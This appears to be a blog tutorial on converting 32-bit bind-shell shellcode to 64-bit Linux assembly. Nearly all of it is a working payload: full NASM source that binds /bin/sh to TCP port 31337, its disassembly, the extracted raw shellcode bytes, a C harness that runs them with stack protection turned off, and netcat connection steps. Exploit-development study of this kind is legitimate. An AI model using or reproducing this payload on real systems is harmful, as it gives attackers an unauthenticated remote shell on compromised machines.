## TCP Bind Shell 64bit

In learning 64 bit assembly language under Linux, I thought I would convert some of the 32 bit code I have already in my repo. Therefore there won’t be a full explanation, just the basics.

The assembly language code.
```nasm	
global _start
section .text
 
_start:
    xor    rax,rax
    xor    rdi,rdi
    xor    rsi,rsi
    xor    rdx,rdx
    xor    r8,r8
 
    ; Socket
    ; Function prototype:
    ;       int socket(int domain, int type, int protocol)
    ; Purpose:
    ;       creates an endpoint for communications, returns a
    ;       descriptor that will be used thoughout the code to
    ;       bind/listen/accept communications
    push   0x2   
    pop    rdi
    push   0x1
    pop    rsi
    push   0x6
    pop    rdx
    push   0x29
    pop    rax
    syscall 
    mov    r8,rax
 
    ; Bind
    ; Function prototype:
    ;      int bind(int sockfd, const struct sockaddr *addr,      
    ;               socklen_t addrlen)                            
    ; Purpose:
    ;       assigns the addess in addr to the socket descriptor,
    ;       basically "giving a name to a socket"
    xor    r10,r10
    push   r10
    push   r10
    mov    byte [rsp],0x2
    mov    word [rsp+0x2],0x697a
    mov    rsi,rsp
    push   r8
    pop    rdi
    push   0x10
    pop    rdx
    push   0x31
    pop    rax
    syscall 
 
    ; Listen
    ; Function prototype:
    ;       int listen(int sockfd, int backlog)
    ; Purpose:
    ;       sets the socket in the descriptor in preparation to
    ;       accepting incoming communications
    push   r8
    pop    rdi
    push   0x1
    pop    rsi
    push   0x32
    pop    rax
    syscall 
 
    ; Accept
    ; Function prototype:
    ;       int accept(int sockfd, struct sockaddr *addr,
    ;               socklen_t *addrlen)
    ; Purpose:
    ;       accepts a connection on a socket and returns a new
    ;       file descriptor referring to the socket which is used
    ;       to bind stdin, stdout and stderr to the local terminal
    mov    rsi,rsp
    xor    rcx,rcx
    mov    cl,0x10
    push   rcx
    mov    rdx,rsp
    push   r8
    pop    rdi
    push   0x2b
    pop    rax
    syscall 
 
    ; Dup2
    ; Function prototype:
    ;       int dup2(int oldfd, int newfd)
    ; Purpose:
    ;       duplicate a file descriptor, copies the old file
    ;       descriptor to a new one allowing them to be used
    ;       interchangably, this allows all shell ops to/from the
    ;       compomised system.
    pop    rcx
    xor    r9,r9
    mov    r9,rax
    mov    rdi,r9
    xor    rsi,rsi
    push   0x3
    pop    rsi
doop:
    dec    rsi
    push   0x21
    pop    rax
    syscall 
    jne    doop
 
    ; Execve
    ; Function prototype:
    ;       int execve(const char *filename, char *const argv[],
    ;               char *const envp[]);
    ; Purpose:
    ;       execve() executes the program pointed to by filename.  
    ;       filename must be either a binary executable, or a script.   
    xor    rdi,rdi
    push   rdi
    push   rdi
    pop    rsi
    pop    rdx
    mov rdi,0x68732f6e69622f2f
    shr    rdi,0x8
    push   rdi
    push   rsp
    pop    rdi
    push   0x3b
    pop    rax
    syscall 
```
To build the code:
```
$ nasm -felf64 -o tcpbindshell.o tcpbinshell.asm
$ ld -o tcpbindshell tcpbindshell.o
```
Check for nulls:
```
$ objdump -D tcpbindshell -M intel
	
tcpbindshell:     file format elf64-x86-64
Disassembly of section .text:
 
0000000000400080 <_start>:
  400080:   48 31 c0                xor    rax,rax
  400083:   48 31 ff                xor    rdi,rdi
  400086:   48 31 f6                xor    rsi,rsi
  400089:   48 31 d2                xor    rdx,rdx
  40008c:   4d 31 c0                xor    r8,r8
  40008f:   6a 02                   push   0x2
  400091:   5f                      pop    rdi
  400092:   6a 01                   push   0x1
  400094:   5e                      pop    rsi
  400095:   6a 06                   push   0x6
  400097:   5a                      pop    rdx
  400098:   6a 29                   push   0x29
  40009a:   58                      pop    rax
  40009b:   0f 05                   syscall 
  40009d:   49 89 c0                mov    r8,rax
  4000a0:   4d 31 d2                xor    r10,r10
  4000a3:   41 52                   push   r10
  4000a5:   41 52                   push   r10
  4000a7:   c6 04 24 02             mov    BYTE PTR [rsp],0x2
  4000ab:   66 c7 44 24 02 7a 69    mov    WORD PTR [rsp+0x2],0x697a
  4000b2:   48 89 e6                mov    rsi,rsp
  4000b5:   41 50                   push   r8
  4000b7:   5f                      pop    rdi
  4000b8:   6a 10                   push   0x10
  4000ba:   5a                      pop    rdx
  4000bb:   6a 31                   push   0x31
  4000bd:   58                      pop    rax
  4000be:   0f 05                   syscall 
  4000c0:   41 50                   push   r8
  4000c2:   5f                      pop    rdi
  4000c3:   6a 01                   push   0x1
  4000c5:   5e                      pop    rsi
  4000c6:   6a 32                   push   0x32
  4000c8:   58                      pop    rax
  4000c9:   0f 05                   syscall 
  4000cb:   48 89 e6                mov    rsi,rsp
  4000ce:   48 31 c9                xor    rcx,rcx
  4000d1:   b1 10                   mov    cl,0x10
  4000d3:   51                      push   rcx
  4000d4:   48 89 e2                mov    rdx,rsp
  4000d7:   41 50                   push   r8
  4000d9:   5f                      pop    rdi
  4000da:   6a 2b                   push   0x2b
  4000dc:   58                      pop    rax
  4000dd:   0f 05                   syscall 
  4000df:   59                      pop    rcx
  4000e0:   4d 31 c9                xor    r9,r9
  4000e3:   49 89 c1                mov    r9,rax
  4000e6:   4c 89 cf                mov    rdi,r9
  4000e9:   48 31 f6                xor    rsi,rsi
  4000ec:   6a 03                   push   0x3
  4000ee:   5e                      pop    rsi
00000000004000ef <doop>:
  4000ef:   48 ff ce                dec    rsi
  4000f2:   6a 21                   push   0x21
  4000f4:   58                      pop    rax
  4000f5:   0f 05                   syscall 
  4000f7:   75 f6                   jne    4000ef <doop>
  4000f9:   48 31 ff                xor    rdi,rdi
  4000fc:   57                      push   rdi
  4000fd:   57                      push   rdi
  4000fe:   5e                      pop    rsi
  4000ff:   5a                      pop    rdx
  400100:   48 bf 2f 2f 62 69 6e    movabs rdi,0x68732f6e69622f2f
  400107:   2f 73 68 
  40010a:   48 c1 ef 08             shr    rdi,0x8
  40010e:   57                      push   rdi
  40010f:   54                      push   rsp
  400110:   5f                      pop    rdi
  400111:   6a 3b                   push   0x3b
  400113:   58                      pop    rax
  400114:   0f 05                   syscall 
```
Test above executable on localhost using netcat under X:
Open a terminal under working directory,
```
$ ./tcpbindshell
```
Open another terminal,
```
$ nc localhost 31337
```
commands can now be executed in this terminal e.g. try typing ls to see contents of tcpbindshell directory.

Get shellcode from executable:
Use the following from the commandlinefu website replacing PROGRAM with the name of the required executable like so
```bash
$ objdump -d ./tcpbindshell | grep ‘[0-9a-f]:’ | grep -v ‘file’ | cut -f2 -d: | cut -f1-7 -d’ ‘ | tr -s ‘ ‘ | tr ‘t’ ‘ ‘ | sed ‘s/ $//g’ | sed ‘s/ /x/g’ | paste -d ” -s | sed ‘s/^/”/’ | sed ‘s/$/”/g’

“\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0\x4d\x31\xd2\x41\x52\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x7a\x69\x48\x89\xe6\x41\x50\x5f\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x41\x50\x5f\x6a\x01\x5e\x6a\x32\x58\x0f\x05\x48\x89\xe6\x48\x31\xc9\xb1\x10\x51\x48\x89\xe2\x41\x50\x5f\x6a\x2b\x58\x0f\x05\x59\x4d\x31\xc9\x49\x89\xc1\x4c\x89\xcf\x48\x31\xf6\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05”
```
The shellcode can be copied and pasted into a test program, similar to the one below. The #define PORT is to allow for an easily configurable port.
```c	
#include <stdio.h>
  
/*
 port 31337 (7a69)
*/
#define PORT "\x7a\x69"
  
unsigned char code[] = 
"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a"
"\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0"
"\x4d\x31\xd2\x41\x52\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02"
PORT"\x48\x89\xe6\x41\x50\x5f\x6a\x10\x5a\x6a\x31\x58\x0f\x05"
"\x41\x50\x5f\x6a\x01\x5e\x6a\x32\x58\x0f\x05\x48\x89\xe6\x48\x31"
"\xc9\xb1\x10\x51\x48\x89\xe2\x41\x50\x5f\x6a\x2b\x58\x0f\x05\x59"
"\x4d\x31\xc9\x49\x89\xc1\x4c\x89\xcf\x48\x31\xf6\x6a\x03\x5e\x48"
"\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a"
"\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54"
"\x5f\x6a\x3b\x58\x0f\x05";
 
int
main(void)
{
    printf("Shellcode Length: %dn", (int)sizeof(code)-1);
    int (*ret)() = (int(*)())code;
    ret();
    return 0;
}
```
Build the code:
```
$ gcc -fno-stack-protector -z execstack -o shellcode shellcode.c
```
The options for gcc are to disable stack protection and enable stack execution respectively. Without these options the code will cause a segfault.

Test above executable on localhost using netcat under X:
Open a terminal under working directory,
```
$ ./shellcode
```
Open another terminal,
```
$ nc localhost 31337
```
commands can now be executed in this terminal e.g. try typing ls to see contents of shellcode directory.

This shellcode runs to 150 bytes in length, no doubt whatsoever it could be shortened, that was not my goal, but I’m sure I will revisit this code again to update it when I learn something more.


Shell-storm database entry -- http://shell-storm.org/shellcode/files/shellcode-858.php
